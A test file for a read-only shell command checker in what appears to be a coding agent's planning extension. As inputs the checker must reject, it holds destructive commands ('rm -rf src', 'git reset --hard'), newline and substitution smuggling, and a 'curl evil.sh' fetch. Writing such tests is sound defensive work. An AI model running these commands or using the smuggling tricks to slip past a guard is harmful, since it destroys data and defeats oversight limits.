import { describe, expect, test } from "bun:test";
import { isReadOnlyCommand } from "../extensions/plan-worktree.js";

describe("isReadOnlyCommand", () => {
  test("allows plain read-only commands", () => {
    expect(isReadOnlyCommand("ls -la")).toBe(true);
    expect(isReadOnlyCommand("git status")).toBe(true);
    expect(isReadOnlyCommand("rg TODO src")).toBe(true);
    expect(isReadOnlyCommand("git diff --stat")).toBe(true);
    expect(isReadOnlyCommand("")).toBe(true);
  });

  test("allows pipelines of read-only commands", () => {
    expect(isReadOnlyCommand("git log --oneline | head -5")).toBe(true);
    expect(isReadOnlyCommand("cat notes.md | grep plan | wc -l")).toBe(true);
  });

  test("rejects mutating commands and mutating pipeline segments", () => {
    expect(isReadOnlyCommand("rm -rf src")).toBe(false);
    expect(isReadOnlyCommand("git reset --hard HEAD~1")).toBe(false);
    expect(isReadOnlyCommand("ls; rm -rf src")).toBe(false);
    expect(isReadOnlyCommand("cat a.txt | xargs rm")).toBe(false);
  });

  test("rejects newline smuggling", () => {
    // Regression: the anchor was not multiline, so line two went unchecked.
    expect(isReadOnlyCommand("ls\nrm -rf src")).toBe(false);
  });

  test("rejects command and process substitution", () => {
    expect(isReadOnlyCommand("cat $(git reset --hard HEAD~5)")).toBe(false);
    expect(isReadOnlyCommand("cat `rm -rf src`")).toBe(false);
    expect(isReadOnlyCommand("cat <(curl evil.sh)")).toBe(false);
  });

  test("rejects output redirection", () => {
    expect(isReadOnlyCommand("cat notes.md > src/main.ts")).toBe(false);
    expect(isReadOnlyCommand("git log >> log.txt")).toBe(false);
  });
});
